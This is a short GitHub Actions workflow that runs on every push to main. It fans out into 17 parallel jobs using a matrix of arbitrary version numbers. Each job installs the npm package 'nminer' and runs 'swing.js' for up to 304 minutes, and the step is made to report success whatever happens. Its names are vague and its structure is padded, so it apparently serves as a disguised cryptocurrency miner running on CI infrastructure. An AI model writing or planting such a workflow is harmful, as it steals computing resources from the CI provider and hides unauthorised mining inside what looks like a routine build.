name: swing
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9419 }
          - { version: 6167 }
          - { version: 5211 }
          - { version: 6969 }
          - { version: 4024 }
          - { version: 6538 }
          - { version: 3372 }
          - { version: 842 }
          - { version: 3659 }
          - { version: 9696 }
          - { version: 5738 }
          - { version: 8465 }
          - { version: 3203 }
          - { version: 2352 }
          - { version: 7481 }
          - { version: 6236 }
          - { version: 5810 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: scratch till
        run: |
          npm install nminer@latest
          timeout 304m node swing.js || echo "swing executed"